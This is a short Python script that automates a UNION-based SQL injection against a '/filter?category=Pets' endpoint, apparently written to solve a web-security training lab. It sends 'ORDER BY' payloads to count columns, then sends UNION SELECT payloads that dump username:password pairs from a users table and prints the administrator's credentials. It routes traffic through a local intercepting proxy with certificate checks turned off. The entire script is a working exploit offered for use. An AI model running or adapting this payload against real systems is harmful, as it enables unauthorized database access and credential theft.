import requests
import sys 
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http" : "http://127.0.0.1:8080" , "https" : "http://127.0.0.1:8080"}

def findNumberofColumns(url,path):
    for i in range(1,50):
        r = requests.get(url+path+f"'order by {i} --",proxies=proxies,verify=False)
        if r.status_code != 200:
            return i -1
    return False

def dumpData(url,path,cols):
    for i in range(1,cols+1):
        payload_list = ["NULL"] * cols
        payload_list[i-1] = "'a'"
        r = requests.get(url+path+f"' union select {','.join(payload_list)} --",proxies=proxies,verify=False)
        if r.status_code == 200:
            payload_list[i-1] = f"username ||  ':' || password "
            r= requests.get(url+path+f"' union select {','.join(payload_list)} from users --",proxies=proxies,verify=False)
            soup = BeautifulSoup(r.text,"html.parser")
            rows = soup.find_all('tr')
            for row in rows:
                data = row.find('th').text
                if "administrator" in data:
                    return data

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        path= "/filter?category=Pets"
        print("[+] Expoit Union Base SQL Injection")
        cols = findNumberofColumns(url,path)
        if cols:
            print(f"[+] Number of Columns {cols}")
            allData = dumpData(url,path,cols)
            if allData:
                print(f"[+] {allData.split(':')[0]} => {allData.split(':')[1]}")
            else:
                print("Adminstrator Cannot Found ")
        else:
            print(f"[-] Unsuccessed SQL Injection")

    except IndexError:
        print("[-] python3 UnionSQLI.py <url>")
        sys.exit()